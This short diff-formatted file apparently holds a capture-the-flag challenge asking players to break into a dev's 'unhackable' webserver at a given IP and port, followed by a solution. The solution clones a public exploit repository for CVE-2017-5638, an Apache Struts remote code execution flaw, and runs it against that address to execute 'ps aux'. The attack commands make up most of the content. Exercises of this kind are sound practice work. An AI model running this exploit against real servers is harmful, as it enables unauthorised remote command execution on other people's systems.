@@ -1,0 +1,10 @@
+One of the devs challenged us to break into his "unhackable" webserver. Can any of the pages be exploited? http://34.123.144.218:3543
+
+
+Bonus: Hard-Challenge3
+
+
+
+
+git clone https://github.com/jrrdev/cve-2017-5638
+python2 cve-2017-5638/exploit/exploit.py http://34.123.144.218:3543 "ps aux"
